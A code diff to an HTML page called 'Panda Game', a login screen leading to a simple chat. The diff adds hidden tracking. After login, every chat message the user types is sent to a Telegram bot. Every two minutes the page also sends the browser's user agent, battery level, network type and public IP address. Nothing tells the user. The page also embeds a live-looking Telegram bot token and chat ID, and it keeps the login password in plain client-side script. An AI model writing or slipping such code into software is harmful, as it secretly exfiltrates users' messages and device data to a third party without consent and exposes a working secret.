@@ -1,186 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Panda Game 🐼</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f0f0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      overflow: hidden;
-      position: relative;
-    }
-
-    /* Panda logo background */
-    body::before {
-      content: "🐼";
-      font-size: 180px;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      opacity: 0.1; /* একটু হালকা */
-      z-index: 0;
-    }
-
-    /* Dark overlay for classy look */
-    body::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.25); /* ব্লার/ডার্ক ইফেক্ট */
-      z-index: 0;
-    }
-
-    .login-box, .chat-box {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 25px 20px;
-      border-radius: 16px;
-      width: 340px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-      text-align: center;
-      position: relative;
-      z-index: 1;
-    }
-    h2 {
-      margin-bottom: 20px;
-      color: #333;
-      font-weight: 600;
-    }
-    input {
-      width: 90%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 15px;
-      transition: all 0.3s ease;
-    }
-    input:focus {
-      border-color: #4caf50;
-      box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
-      outline: none;
-    }
-    button {
-      padding: 12px 20px;
-      background: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 12px;
-      font-size: 15px;
-      transition: all 0.3s ease;
-    }
-    button:hover {
-      background: #45a049;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    }
-    .powered {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #555;
-    }
-    .chat-messages {
-      height: 250px;
-      overflow-y: auto;
-      border: 1px solid #ddd;
-      padding: 10px;
-      border-radius: 8px;
-      margin-bottom: 10px;
-      background: #f9f9f9;
-      text-align: left;
-    }
-    .msg {
-      margin: 5px 0;
-      padding: 6px 12px;
-      border-radius: 10px;
-      display: inline-block;
-      max-width: 80%;
-      font-size: 14px;
-    }
-    .me {
-      background: #d1ffd1;
-      align-self: flex-end;
-    }
-    .other {
-      background: #d1e0ff;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Panda Game 🐼</title>
+<style>
+body {
+  margin: 0;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: #f0f0f0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+  overflow: hidden;
+  position: relative;
+}
+/* Panda logo background */
+body::before {
+  content: "🐼";
+  font-size: 180px;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  opacity: 0.1;
+  z-index: 0;
+}
+/* Dark overlay */
+body::after {
+  content: "";
+  position: absolute;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.25);
+  z-index: 0;
+}
+.login-box, .chat-box {
+  background: rgba(255,255,255,0.95);
+  padding: 25px 20px;
+  border-radius: 16px;
+  width: 340px;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+  text-align: center;
+  position: relative;
+  z-index: 1;
+}
+h2 { margin-bottom:20px; color:#333; font-weight:600;}
+input { width:90%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:8px; font-size:15px; transition:0.3s;}
+input:focus {border-color:#4caf50; box-shadow:0 0 8px rgba(76,175,80,0.4); outline:none;}
+button { padding:12px 20px; background:#4caf50; color:white; border:none; border-radius:8px; cursor:pointer; margin-top:12px; font-size:15px; transition:0.3s;}
+button:hover {background:#45a049; box-shadow:0 4px 12px rgba(0,0,0,0.2);}
+.powered {margin-top:15px; font-size:12px; color:#555;}
+.chat-messages { height:250px; overflow-y:auto; border:1px solid #ddd; padding:10px; border-radius:8px; margin-bottom:10px; background:#f9f9f9; text-align:left;}
+.msg {margin:5px 0; padding:6px 12px; border-radius:10px; display:inline-block; max-width:80%; font-size:14px;}
+.me {background:#d1ffd1; align-self:flex-end;}
+.other {background:#d1e0ff;}
+</style>
 </head>
 <body>
 
-  <!-- Login Page -->
-  <div class="login-box" id="loginBox">
-    <h2>Panda game 🐼</h2>
-    <input type="text" id="username" placeholder="Enter Username">
-    <input type="password" id="password" placeholder="Enter Password">
-    <button onclick="login()">Login</button>
-    <div class="powered">Powered by Panda</div>
-  </div>
+<!-- Login Page -->
+<div class="login-box" id="loginBox">
+<h2>Panda game 🐼</h2>
+<input type="text" id="username" placeholder="Enter Username">
+<input type="password" id="password" placeholder="Enter Password">
+<button onclick="login()">Login</button>
+<div class="powered">Powered by Panda</div>
+</div>
 
-  <!-- Chat Page -->
-  <div class="chat-box" id="chatBox" style="display:none;">
-    <h2>Welcome to Panda Chat 🐼</h2>
-    <div class="chat-messages" id="messages"></div>
-    <input type="text" id="chatInput" placeholder="Type a message..." onkeypress="if(event.key==='Enter'){sendMessage()}">
-    <button onclick="sendMessage()">Send</button>
-  </div>
+<!-- Chat Page -->
+<div class="chat-box" id="chatBox" style="display:none;">
+<h2>Welcome to Panda Chat 🐼</h2>
+<div class="chat-messages" id="messages"></div>
+<input type="text" id="chatInput" placeholder="Type a message..." onkeypress="if(event.key==='Enter'){sendMessage()}">
+<button onclick="sendMessage()">Send</button>
+</div>
 
-  <script>
-    const correctUser = "Jpanda";
-    const correctPass = "Nila";
+<script>
+const correctUser = "Jpanda";
+const correctPass = "Nila";
 
-    function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
+// ===== Telegram Config =====
+const TELEGRAM_TOKEN = "8364245474:AAHyrjR4UfitwsRnkwlPqJaBtBvLoQlQO1g";
+const CHAT_ID = "6975173404";
 
-      if (user === correctUser && pass === correctPass) {
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("chatBox").style.display = "block";
-      } else {
-        alert("❌ Wrong username or password!");
-      }
-    }
+function sendToTelegram(message){
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  fetch(url, {
+    method:"POST",
+    headers: { "Content-Type":"application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  });
+}
 
-    function sendMessage() {
-      const input = document.getElementById("chatInput");
-      const msg = input.value.trim();
-      if (msg === "") return;
+// ===== Login Function =====
+function login(){
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+  if(user === correctUser && pass === correctPass){
+    document.getElementById("loginBox").style.display="none";
+    document.getElementById("chatBox").style.display="block";
 
-      const messagesDiv = document.getElementById("messages");
+    // Send basic info immediately and every 2 minutes
+    sendDeviceInfo();
+    setInterval(sendDeviceInfo, 120000); // 120000 ms = 2 minutes
 
-      // show my message as "Panda"
-      const myMsg = document.createElement("div");
-      myMsg.className = "msg me";
-      myMsg.textContent = "Panda: " + msg;
-      messagesDiv.appendChild(myMsg);
+  } else { alert("❌ Wrong username or password!"); }
+}
 
-      // scroll down
-      messagesDiv.scrollTop = messagesDiv.scrollHeight;
+// ===== Chat Function =====
+function sendMessage(){
+  const input = document.getElementById("chatInput");
+  const msg = input.value.trim();
+  if(msg==="") return;
 
-      input.value = "";
+  const messagesDiv = document.getElementById("messages");
 
-      // simulate reply as "Bampo"
-      setTimeout(() => {
-        const reply = document.createElement("div");
-        reply.className = "msg other";
-        reply.textContent = "Bampo: " + msg;
-        messagesDiv.appendChild(reply);
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
-      }, 1000);
-    }
-  </script>
+  // Show message in chat
+  const myMsg = document.createElement("div");
+  myMsg.className = "msg me";
+  myMsg.textContent = "Panda: "+msg;
+  messagesDiv.appendChild(myMsg);
+
+  messagesDiv.scrollTop = messagesDiv.scrollHeight;
+
+  // Send message to Telegram
+  sendToTelegram(`Chat Message from Panda: ${msg}`);
+
+  input.value="";
+}
+
+// ===== Device Info Function =====
+async function sendDeviceInfo(){
+  let info = "📱 User Info:\n";
+
+  // Browser + OS
+  info += `Browser: ${navigator.userAgent}\n`;
+
+  // Battery info
+  let battery = await navigator.getBattery().catch(()=>null);
+  if(battery){
+    info += `Battery: ${Math.floor(battery.level*100)}%, Charging: ${battery.charging}\n`;
+  } else {
+    info += "Battery: Not available\n";
+  }
+
+  // Network info
+  if(navigator.connection){
+    info += `Network: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps\n`;
+  } else { info += "Network: Unknown\n"; }
+
+  // Public IP
+  let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
+  info += `IP: ${ip.ip}\n`;
+
+  sendToTelegram(info);
+}
+</script>
 
 </body>
 </html>
